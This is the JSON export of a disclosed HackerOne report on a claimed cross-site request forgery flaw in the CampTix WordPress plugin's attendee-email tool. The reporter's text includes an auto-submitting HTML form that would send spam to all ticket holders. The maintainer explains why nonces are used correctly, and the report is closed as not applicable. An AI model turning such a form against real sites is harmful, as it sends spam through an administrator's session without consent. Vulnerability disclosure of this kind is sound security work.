{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "not-applicable", 
    "bug_reporter_agreed_on_going_public_at": null, 
    "voters": [
        "dyabla"
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 159925, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2016-08-24T18:46:45.048Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Send emails to all users using Camptix", 
    "is_member_of_team?": null, 
    "vote_count": 1, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "N/A", 
    "public": true, 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2016-08-17T15:18:55.258Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-17T15:18:55.258Z", 
            "actor": {
                "username": "iandunn", 
                "url": "/iandunn", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/974/4a74c8e7efc3996e6fff3f72ddccc09ab92986a2_medium.jpg?1506561124"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "iandunn-projects", 
            "message": "Hi Jason, thanks for the report. It gave me all the info I need to dig into this, so it was very helpful :)\n\nAt first glance, this doesn't seem like it'd be exploitable in a real-world scenario. I'm going to dig into it more to check if I'm right about that, though. I'll let you know what I find out later today.", 
            "markdown_message": "<p>Hi Jason, thanks for the report. It gave me all the info I need to dig into this, so it was very helpful :)</p>\n\n<p>At first glance, this doesn&#39;t seem like it&#39;d be exploitable in a real-world scenario. I&#39;m going to dig into it more to check if I&#39;m right about that, though. I&#39;ll let you know what I find out later today.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1132074, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-17T15:19:46.237Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-02-28T13:10:44.752Z", 
            "actor": {
                "username": "iandunn", 
                "url": "/iandunn", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/974/4a74c8e7efc3996e6fff3f72ddccc09ab92986a2_medium.jpg?1506561124"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "added_weaknesses": [
                    {
                        "id": 45, 
                        "name": "Cross-Site Request Forgery (CSRF)"
                    }
                ], 
                "removed_weaknesses": [
                    {
                        "id": 57, 
                        "name": "Violation of Secure Design Principles"
                    }
                ]
            }, 
            "team_handle": "iandunn-projects", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportVulnerabilityTypesUpdated", 
            "id": 1132076, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-17T15:26:19.174Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-17T15:26:19.174Z", 
            "actor": {
                "username": "jshindl", 
                "url": "/jshindl", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "iandunn-projects", 
            "message": "As far as I can tell, you need to trick an admin who is already logged into wordpress into visiting a malicious website, which has access to a wpnonce value (which from that link, is doable). I agree, it is remote -- but a determined hacker could do it. :)", 
            "markdown_message": "<p>As far as I can tell, you need to trick an admin who is already logged into wordpress into visiting a malicious website, which has access to a wpnonce value (which from that link, is doable). I agree, it is remote -- but a determined hacker could do it. :)</p>\n", 
            "type": "Activities::Comment", 
            "id": 1132096, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-17T23:40:43.456Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-17T23:40:43.456Z", 
            "actor": {
                "username": "iandunn", 
                "url": "/iandunn", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/974/4a74c8e7efc3996e6fff3f72ddccc09ab92986a2_medium.jpg?1506561124"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "iandunn-projects", 
            "message": "Hey Jason, it doesn't look like I'll be able to dig into this any more today like I had planned, but I should be able to tomorrow. I'll keep you updated.", 
            "markdown_message": "<p>Hey Jason, it doesn&#39;t look like I&#39;ll be able to dig into this any more today like I had planned, but I should be able to tomorrow. I&#39;ll keep you updated.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1133289, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-19T01:29:33.353Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-19T01:29:33.353Z", 
            "actor": {
                "username": "iandunn", 
                "url": "/iandunn", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/974/4a74c8e7efc3996e6fff3f72ddccc09ab92986a2_medium.jpg?1506561124"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "iandunn-projects", 
            "message": "Hi Jason, I looked deeper into this and it doesn't look like there's any vulnerability here.\n\nThe article you mentioned describes a situation where the following conditions apply:\n\n1. The code was being executed for unauthenticated visitors\n1. The code is relying on nonces for authorization instead of using `current_user_can()`\n1. The site is either a) Running WP 3.3.x or older and hasn't defined custom `NONCE_SALT`/`NONCE_KEY` values; or b) Has their web server incorrectly configured such that their `wp-config.php` file does not get parsed by the PHP engine and can be read plain-text by making an HTTP request to its URL\n\nThe situation with CampTix is very different, though.\n\n1. The Notify tool can only be used by authenticated users who have administrative privileges. This means that `$token` will be a CSPRN.\n1. CampTix is using nonces properly. They're used to verify *intention* (i.e., to protect against CSRF), not to verify *authorization* (which is the job of `current_user_can()`). \n\nThe crux of the vulnerability that the article described is that 3rd piece, though. That's not something CampTix has any control over; it depends entirely on how the individual site has configured their web server and their `wp-config.php` file, and whether or not they're running a very old version of WordPress. \n\nPersonally, I think that those conditions are much more uncommon than the article's author claims, and I'm confident that they're extremely rare in professionally-run sites. Further, if you could read `wp-config.php`, you could do far worse things than CSRF in CampTix, like creating a new admin user in the database, read hashed passwords from the db and easily crack them, use CSRF to add a new admin user, etc.\n\nI think if there is an exploit here, it wouldn't just be a vulnerability in CampTix, it would be a vulnerability in WordPress Core, and every plugin that uses nonces in the way they're meant to be used.\n\nI'm happy to be proven wrong, though. If you can generate a correct nonce for the Notify action on https://testing.wordcamp.org then I'll definitely accept this (even if don't perform the social engineering component).\n\nOtherwise, I think this can be closed as `Not applicable`.", 
            "markdown_message": "<p>Hi Jason, I looked deeper into this and it doesn&#39;t look like there&#39;s any vulnerability here.</p>\n\n<p>The article you mentioned describes a situation where the following conditions apply:</p>\n\n<ol>\n<li>The code was being executed for unauthenticated visitors</li>\n<li>The code is relying on nonces for authorization instead of using <code>current_user_can()</code>\n</li>\n<li>The site is either a) Running WP 3.3.x or older and hasn&#39;t defined custom <code>NONCE_SALT</code>/<code>NONCE_KEY</code> values; or b) Has their web server incorrectly configured such that their <code>wp-config.php</code> file does not get parsed by the PHP engine and can be read plain-text by making an HTTP request to its URL</li>\n</ol>\n\n<p>The situation with CampTix is very different, though.</p>\n\n<ol>\n<li>The Notify tool can only be used by authenticated users who have administrative privileges. This means that <code>$token</code> will be a CSPRN.</li>\n<li>CampTix is using nonces properly. They&#39;re used to verify <em>intention</em> (i.e., to protect against CSRF), not to verify <em>authorization</em> (which is the job of <code>current_user_can()</code>). </li>\n</ol>\n\n<p>The crux of the vulnerability that the article described is that 3rd piece, though. That&#39;s not something CampTix has any control over; it depends entirely on how the individual site has configured their web server and their <code>wp-config.php</code> file, and whether or not they&#39;re running a very old version of WordPress. </p>\n\n<p>Personally, I think that those conditions are much more uncommon than the article&#39;s author claims, and I&#39;m confident that they&#39;re extremely rare in professionally-run sites. Further, if you could read <code>wp-config.php</code>, you could do far worse things than CSRF in CampTix, like creating a new admin user in the database, read hashed passwords from the db and easily crack them, use CSRF to add a new admin user, etc.</p>\n\n<p>I think if there is an exploit here, it wouldn&#39;t just be a vulnerability in CampTix, it would be a vulnerability in WordPress Core, and every plugin that uses nonces in the way they&#39;re meant to be used.</p>\n\n<p>I&#39;m happy to be proven wrong, though. If you can generate a correct nonce for the Notify action on <a title=\"https://testing.wordcamp.org\" href=\"/redirect?signature=e9d992a6c4158bab6f3815258873c40bf32cc854&amp;url=https%3A%2F%2Ftesting.wordcamp.org\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://testing.wordcamp.org</span><i class=\"icon-external-link\"></i></a> then I&#39;ll definitely accept this (even if don&#39;t perform the social engineering component).</p>\n\n<p>Otherwise, I think this can be closed as <code>Not applicable</code>.</p>\n", 
            "type": "Activities::Comment", 
            "id": 1139261, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-24T18:46:29.224Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-24T18:46:29.224Z", 
            "actor": {
                "username": "iandunn", 
                "url": "/iandunn", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/974/4a74c8e7efc3996e6fff3f72ddccc09ab92986a2_medium.jpg?1506561124"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "iandunn-projects", 
            "message": "I'm gonna go ahead and close this since you haven't responded, but if you think there's still a vulnerability please let me know and I can re-open it.", 
            "markdown_message": "<p>I&#39;m gonna go ahead and close this since you haven&#39;t responded, but if you think there&#39;s still a vulnerability please let me know and I can re-open it.</p>\n", 
            "type": "Activities::BugNotApplicable", 
            "id": 1152362, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-08-24T18:46:45.082Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-08-24T18:46:45.082Z", 
            "actor": {
                "username": "iandunn", 
                "url": "/iandunn", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/974/4a74c8e7efc3996e6fff3f72ddccc09ab92986a2_medium.jpg?1506561124"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "iandunn-projects", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1152363, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2016-09-27T21:45:12.184Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2016-09-27T21:45:12.184Z", 
            "actor": {
                "username": "iandunn", 
                "url": "/iandunn", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/974/4a74c8e7efc3996e6fff3f72ddccc09ab92986a2_medium.jpg?1506561124"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "iandunn-projects", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ManuallyDisclosed", 
            "id": 1220157, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "reporter": {
        "username": "jshindl", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/jshindl", 
        "profile_picture_urls": {
            "small": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 45, 
        "name": "Cross-Site Request Forgery (CSRF)"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "disclosed_at": "2016-09-27T21:45:12.247Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/159925", 
    "created_at": "2016-08-17T03:57:01.296Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>Ian,<br>\nThis is my first stab at submitting a bug, and I&#39;m not even sure it is one. Here&#39;s what I found.</p>\n\n<p>If an admin of a site using Camptix who is logged into the admin screen visits a malicious site which has access to a valid wpnonce value could send a large volume of spam to all ticket holders.</p>\n\n<p>POC: <br>\n&lt;body onload=&quot;document.getElementById(&#39;s&#39;).submit();&quot;&gt;<br>\n&lt;form method=post id=s action=&quot;http://xxx/wp-admin/edit.php?post_type=tix_ticket&amp;page=camptix_tools&amp;tix_summarize=1&amp;tix_section=notify&amp;tix_notify_attendees=1&quot;&gt;<br>\n    &lt;input type=hidden name=&quot;tix-notify-segment-query&quot; value=&#39;[{&quot;field&quot;:&quot;ticket&quot;,&quot;op&quot;:&quot;is not&quot;,&quot;value&quot;:&quot;1&quot;}]&#39;&gt;<br>\n    &lt;input type=hidden name=&quot;tix-notify-segment-match&quot; value=&quot;OR&quot;&gt;<br>\n&lt;input type=hidden name=&quot;tix_notify_subject&quot; value=&quot;camptix likes viagara&quot;&gt;<br>\n&lt;input type=hidden name=&quot;tix_notify_body&quot; value=&quot;send scary messages about viagra&quot;&gt;<br>\n&lt;input type=hidden name=&quot;tix_notify_attendees&quot; value=&quot;1&quot;&gt;<br>\n&lt;input type=hidden name=&quot;tix_notify_submit &quot; value=&quot;Send E-mails&quot;&gt;<br>\n&lt;input type=hidden name=&quot;_wpnonce&quot; value=&quot;122536321b&quot;&gt;<br>\n&lt;input type=hidden name=&quot;_wp_http_referer&quot; value=&quot;/wp-admin/edit.php?post_type=tix_ticket&amp;page=camptix_tools&amp;tix_summarize=1&amp;tix_section=notify&amp;tix_notify_attendees=1&quot;&gt;<br>\n    &lt;input type=submit &gt;<br><br>\n&lt;/form&gt;<br>\n&lt;/body&gt;</p>\n\n<p>I&#39;m not an expert at wpnonce values, but the documentation of Wordpress indicates that you shouldn&#39;t rely on it for security, and this article claims they can be generated easily.<br>\n<a title=\"https://codeseekah.com/2016/01/21/wordpress-nonces-vulnerabilities/\" href=\"/redirect?signature=2dbe17b113d07544bfc62ef392870f1b6ab7e6b4&amp;url=https%3A%2F%2Fcodeseekah.com%2F2016%2F01%2F21%2Fwordpress-nonces-vulnerabilities%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://codeseekah.com/2016/01/21/wordpress-nonces-vulnerabilities/</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>The POC only sends only email to each recipient, but you could adapt it to attempt to send more. Depending on how many attendees, the script could send zero or thousands of emails.</p>\n\n<p>I&#39;m eager to hear back, and I&#39;m eager to hear how I could make this report more helpful. :)<br>\nJason</p>\n", 
    "vulnerability_information": "Ian,\nThis is my first stab at submitting a bug, and I'm not even sure it is one. Here's what I found.\n\nIf an admin of a site using Camptix who is logged into the admin screen visits a malicious site which has access to a valid wpnonce value could send a large volume of spam to all ticket holders.\n\nPOC: \n<body onload=\"document.getElementById('s').submit();\">\n<form method=post id=s action=\"http://xxx/wp-admin/edit.php?post_type=tix_ticket&page=camptix_tools&tix_summarize=1&tix_section=notify&tix_notify_attendees=1\">\n\t<input type=hidden name=\"tix-notify-segment-query\" value='[{\"field\":\"ticket\",\"op\":\"is not\",\"value\":\"1\"}]'>\n\t<input type=hidden name=\"tix-notify-segment-match\" value=\"OR\">\n<input type=hidden name=\"tix_notify_subject\" value=\"camptix likes viagara\">\n<input type=hidden name=\"tix_notify_body\" value=\"send scary messages about viagra\">\n<input type=hidden name=\"tix_notify_attendees\" value=\"1\">\n<input type=hidden name=\"tix_notify_submit \" value=\"Send E-mails\">\n<input type=hidden name=\"_wpnonce\" value=\"122536321b\">\n<input type=hidden name=\"_wp_http_referer\" value=\"/wp-admin/edit.php?post_type=tix_ticket&page=camptix_tools&tix_summarize=1&tix_section=notify&tix_notify_attendees=1\">\n\t<input type=submit >\t\n</form>\n</body>\n\nI'm not an expert at wpnonce values, but the documentation of Wordpress indicates that you shouldn't rely on it for security, and this article claims they can be generated easily.\nhttps://codeseekah.com/2016/01/21/wordpress-nonces-vulnerabilities/\n\nThe POC only sends only email to each recipient, but you could adapt it to attempt to send more. Depending on how many attendees, the script could send zero or thousands of emails.\n\nI'm eager to hear back, and I'm eager to hear how I could make this report more helpful. :)\nJason\n\n", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "", 
            "about": "I'm a WordPress developer who maintains several small open source projects.", 
            "twitter_handle": "", 
            "name": "Ian Dunn"
        }, 
        "handle": "iandunn-projects", 
        "url": "https://hackerone.com/iandunn-projects", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/162/eb309ba9f6270977cf4e55dc66f0b8d7099a34b7_small.jpg?1508123836", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/162/cb18840e181960dbb77b2b8a38f637a2df47fa29_medium.jpg?1508123836"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 162, 
        "default_currency": "usd"
    }, 
    "is_published": false
}